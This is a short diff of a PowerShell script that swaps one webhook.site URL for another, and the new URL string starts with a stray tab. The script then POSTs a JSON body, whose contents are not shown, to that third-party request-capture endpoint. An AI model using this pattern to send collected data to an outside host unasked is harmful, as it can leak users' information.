@@ -39,7 +39,7 @@ $body = @{
 } | ConvertTo-Json -Depth 2
 
 # Define the webhook URL
-$webhookUrl = "https://webhook.site/28fc8f37-87cb-4dd6-8756-bf1d39ba41ca"
+$webhookUrl = "	https://webhook.site/2fe522fb-2bca-4689-aeeb-5169bf06f0e8"
 
 # Send the JSON data to the webhook
 Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
